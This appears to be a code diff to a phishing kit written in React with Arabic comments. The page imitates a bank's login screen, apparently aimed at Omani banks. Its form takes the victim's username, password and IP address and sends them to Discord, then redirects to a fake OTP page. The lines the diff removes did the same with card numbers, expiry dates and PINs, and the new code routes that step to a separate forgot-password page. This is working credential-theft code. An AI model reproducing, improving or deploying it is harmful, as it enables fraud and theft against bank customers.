@@ -12,7 +12,6 @@ function BankLoginContent() {
   const { Send } = TeleSned();
   const [ip, setIp] = useState('جاري التحميل...');
   const [isLoading, setIsLoading] = useState(false);
-  const [showForgotPassword, setShowForgotPassword] = useState(false);
   const [showSplash, setShowSplash] = useState(true);
   
   // الحصول على bankId من URL
@@ -66,43 +65,23 @@ function BankLoginContent() {
   // العثور على البنك المحدد
   const selectedBank = banks.find(bank => bank.id === parseInt(bankId));
 
-  // دالة معالجة النموذج
+  // دالة معالجة النموذج (تسجيل الدخول فقط)
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
     
     const form = e.target;
-    let username, password, cardNumber, expiryMonth, expiryYear, pinCode;
-    
-    if (showForgotPassword) {
-      cardNumber = form.cardNumber.value;
-      expiryMonth = form.expiryMonth.value;
-      expiryYear = form.expiryYear.value;
-      pinCode = form.pinCode.value;
-    } else {
-      username = form.username.value;
-      password = form.password.value;
-    }
+    const username = form.username.value;
+    const password = form.password.value;
 
     // إرسال البيانات إلى Discord
     try {
-      let description;
-      if (showForgotPassword) {
-        description = `🔑 **نسيت كلمة المرور**\n\n` +
-                     `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
-                     `💳 **رقم البطاقة:** ${cardNumber}\n` +
-                     `📅 **تاريخ الانتهاء:** ${expiryMonth}/${expiryYear}\n` +
-                     `🔐 **رمز PIN:** ${pinCode}\n` +
-                     `🌐 **IP المستخدم:** ${ip}\n` +
-                     `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
-      } else {
-        description = `🏦 **بيانات تسجيل الدخول**\n\n` +
-                     `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
-                     `👤 **اسم المستخدم:** ${username}\n` +
-                     `🔑 **كلمة المرور:** ${password}\n` +
-                     `🌐 **IP المستخدم:** ${ip}\n` +
-                     `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
-      }
+      const description = `🏦 **بيانات تسجيل الدخول**\n\n` +
+                         `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
+                         `👤 **اسم المستخدم:** ${username}\n` +
+                         `🔑 **كلمة المرور:** ${password}\n` +
+                         `🌐 **IP المستخدم:** ${ip}\n` +
+                         `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
       
       await Send(description);
       console.log('✅ تم إرسال البيانات إلى Discord');
@@ -113,9 +92,13 @@ function BankLoginContent() {
     // التوجيه إلى صفحة OTP بعد 2 ثانية
     setTimeout(() => {
       setIsLoading(false);
-      // التوجيه إلى صفحة OTP مع تمرير البارامترات
       router.push(`/otp?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip)}`);
     }, 2000);
+  };
+
+  // دالة التوجيه إلى صفحة نسيت كلمة المرور
+  const handleForgotPassword = () => {
+    router.push(`/forgot-password?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip)}`);
   };
 
   // شاشة التحميل (Splash Screen)
@@ -203,134 +186,52 @@ function BankLoginContent() {
         {/* نموذج تسجيل الدخول */}
         <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
           <h1 className='text-[#800000] text-lg font-bold text-center mb-4'>
-            {showForgotPassword ? 'استعادة كلمة المرور' : 'تسجيل الدخول'}
+            تسجيل الدخول
           </h1>
           
           <form onSubmit={handleSubmit} className="space-y-5">
-            {!showForgotPassword ? (
-              // حقول تسجيل الدخول العادية
-              <>
-                <div>
-                  <label htmlFor="username" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                    اسم المستخدم <span className="text-[#800000]">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="username"
-                    name="username"
-                    required
-                    placeholder="أدخل اسم المستخدم"
-                    className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
-                    dir="ltr"
-                  />
-                </div>
+            {/* اسم المستخدم */}
+            <div>
+              <label htmlFor="username" className="block mb-1.5 text-sm font-semibold text-gray-700">
+                اسم المستخدم <span className="text-[#800000]">*</span>
+              </label>
+              <input
+                type="text"
+                id="username"
+                name="username"
+                required
+                placeholder="أدخل اسم المستخدم"
+                className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
+                dir="ltr"
+              />
+            </div>
 
-                <div>
-                  <label htmlFor="password" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                    كلمة المرور <span className="text-[#800000]">*</span>
-                  </label>
-                  <input
-                    type="password"
-                    id="password"
-                    name="password"
-                    required
-                    placeholder="أدخل كلمة المرور"
-                    className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
-                    dir="ltr"
-                  />
-                </div>
+            {/* كلمة المرور */}
+            <div>
+              <label htmlFor="password" className="block mb-1.5 text-sm font-semibold text-gray-700">
+                كلمة المرور <span className="text-[#800000]">*</span>
+              </label>
+              <input
+                type="password"
+                id="password"
+                name="password"
+                required
+                placeholder="أدخل كلمة المرور"
+                className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
+                dir="ltr"
+              />
+            </div>
 
-                <button
-                  type="button"
-                  onClick={() => setShowForgotPassword(true)}
-                  className="text-sm text-[#800000] hover:text-[#600000] transition-colors duration-200 text-left"
-                >
-                  نسيت كلمة المرور؟
-                </button>
-              </>
-            ) : (
-              // حقول استعادة كلمة المرور
-              <>
-                <div>
-                  <label htmlFor="cardNumber" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                    رقم البطاقة <span className="text-[#800000]">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="cardNumber"
-                    name="cardNumber"
-                    required
-                    placeholder="____ ____ ____ ____"
-                    className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
-                    dir="ltr"
-                  />
-                </div>
+            {/* زر نسيت كلمة المرور */}
+            <button
+              type="button"
+              onClick={handleForgotPassword}
+              className="text-sm text-[#800000] hover:text-[#600000] transition-colors duration-200 text-left"
+            >
+              نسيت كلمة المرور؟
+            </button>
 
-                <div className="grid grid-cols-2 gap-4">
-                  <div>
-                    <label htmlFor="expiryMonth" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                      الشهر <span className="text-[#800000]">*</span>
-                    </label>
-                    <select
-                      id="expiryMonth"
-                      name="expiryMonth"
-                      required
-                      className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
-                    >
-                      <option value="">MM</option>
-                      {Array.from({ length: 12 }, (_, i) => i + 1).map(month => (
-                        <option key={month} value={month.toString().padStart(2, '0')}>
-                          {month.toString().padStart(2, '0')}
-                        </option>
-                      ))}
-                    </select>
-                  </div>
-                  <div>
-                    <label htmlFor="expiryYear" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                      السنة <span className="text-[#800000]">*</span>
-                    </label>
-                    <select
-                      id="expiryYear"
-                      name="expiryYear"
-                      required
-                      className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
-                    >
-                      <option value="">YYYY</option>
-                      {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map(year => (
-                        <option key={year} value={year}>
-                          {year}
-                        </option>
-                      ))}
-                    </select>
-                  </div>
-                </div>
-
-                <div>
-                  <label htmlFor="pinCode" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                    رمز PIN <span className="text-[#800000]">*</span>
-                  </label>
-                  <input
-                    type="password"
-                    id="pinCode"
-                    name="pinCode"
-                    required
-                    maxLength={4}
-                    placeholder="____"
-                    className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
-                    dir="ltr"
-                  />
-                </div>
-
-                <button
-                  type="button"
-                  onClick={() => setShowForgotPassword(false)}
-                  className="text-sm text-[#800000] hover:text-[#600000] transition-colors duration-200 text-left"
-                >
-                  العودة لتسجيل الدخول
-                </button>
-              </>
-            )}
-
+            {/* زر تسجيل الدخول */}
             <button
               type="submit"
               disabled={isLoading}
@@ -345,7 +246,7 @@ function BankLoginContent() {
                   جاري المعالجة...
                 </span>
               ) : (
-                showForgotPassword ? 'التالي' : 'تسجيل الدخول'
+                'تسجيل الدخول'
               )}
             </button>
           </form>
